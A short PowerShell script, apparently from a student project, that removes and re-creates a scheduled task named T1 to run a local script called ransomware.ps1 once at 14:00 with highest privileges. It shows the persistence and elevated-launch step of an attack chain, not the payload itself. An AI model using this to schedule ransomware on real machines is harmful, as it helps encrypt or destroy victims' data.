Unregister-ScheduledTask -TaskName "T1" -Confirm:$false
$action = New-ScheduledTaskAction -Execute "pwsh" -Argument "C:\Users\leoti\Documents\m2\projet_minientreprise\scripts\m2_minientreprise_scripts\scripts\ransomware.ps1"
$trigger = New-ScheduledTaskTrigger -At 14:00 -Once
$principal = New-ScheduledTaskPrincipal -UserId "leoti" -RunLevel Highest
$task = New-ScheduledTask -Action $action -Trigger $trigger -Principal $principal
Register-ScheduledTask T1 -InputObject $task